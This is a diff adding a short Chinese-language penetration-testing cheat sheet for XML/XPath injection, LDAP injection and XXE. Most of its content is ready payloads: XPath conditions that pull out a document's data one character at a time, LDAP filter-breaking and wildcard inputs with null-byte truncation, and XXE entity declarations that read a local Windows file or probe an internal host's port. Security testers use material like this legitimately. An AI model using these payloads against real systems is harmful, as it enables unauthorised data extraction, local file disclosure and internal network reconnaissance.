@@ -1,0 +1,28 @@
+﻿xml 注入
+很多测试方法同sql注入，但很多信息获取方式同xpath遍历的方法相关。
+如substring，name（），parent::* position(),child::node(),count(),string-length()等。
+测试步骤：
+1、提交下面测试，观看程序变化，但不是造成错误：
+' or count(parent::*[position()=1])=0 or 'a' = 'b
+' or count(parent::*[position()=1])>0 or 'a' = 'b
+如果参数为数字：
+' or count(parent::*[position()=1])=0
+' or count(parent::*[position()=1])>0
+2、提取单个字符串（父节点名称）：
+substring(name(parent::*[position()=1]),1,1) ='a
+3、获取父节点名称后，使用一系列下面格式的条件提取xml树中所有数据（一次一个字节）：
+substring(//parentnodename[position()=1]/child::node()[position()=1]/text(),1,1)='a
+
+ldap注入测试：
+1、输入*
+2、输入大量闭括号)))))))))))))))))))))))
+3、大多ldap均支持cn属性，如果对查询的目录一无所知，使用它
+)(cn=*
+*))(|(cn=*
+*))%00(使用NULL截断)
+
+XXE
+1、定义实体 <!DOCTYPE foo [ <!ENTITY test "test"> ]>，就可以通过&test;引用test
+2、引用外部实体通过关键字SYSTEM，可以接收file、http协议，如：
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///Windows/win.ini" >]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.100:25" >]>，这种方法可用于服务检测
